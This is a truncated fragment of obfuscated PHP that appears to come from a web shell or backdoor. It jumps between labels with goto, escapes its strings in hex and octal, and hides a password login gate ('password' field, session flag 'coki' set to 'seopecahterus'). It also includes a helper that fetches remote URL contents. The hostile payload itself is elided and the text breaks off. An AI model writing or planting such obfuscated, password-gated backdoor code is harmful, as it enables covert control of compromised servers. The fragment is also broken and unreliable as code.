<?php
 ...
 fclose($handle); 
 } else { $url_get_contents_data = false; 
 } return $url_get_contents_data; 
 } goto UUKHK; 
 cJz_p: if (is_logged_in()) 
...
goto lxNvj; 
eiTo4: if (isset($_POST["\160\x61\x73\x73\x77\x6f\x72\144"])) 
...
$_SESSION["\143\157\153\x69"] = "\163\x65\157\x70\x65\x63\x61\x68\x74\x65\x72\165\x73"; 
} else { echo "\111\x6e\143\x6f\x72\162\x65\x63\164\x20\160\x61\163\163\167\x6f\x72\x64\x2e\x20\x50\154\x65\141\163\145\x20\164\x72\171\x20\141\147\x61\151\x6e\56"; 
} } goto cJz_p; 
UUKHK: function is_logged_in() { return isset($_SESSION["\154\x6f\147\x67\x65\144\137\151\156"]) && $_SESSION["\x6c\157\x67\x67\x65\144\x5f\151\156"] === true; 
} goto eiTo4; 
J3h6X: session_start(); 
goto uMr7S; 
lxNvj: 
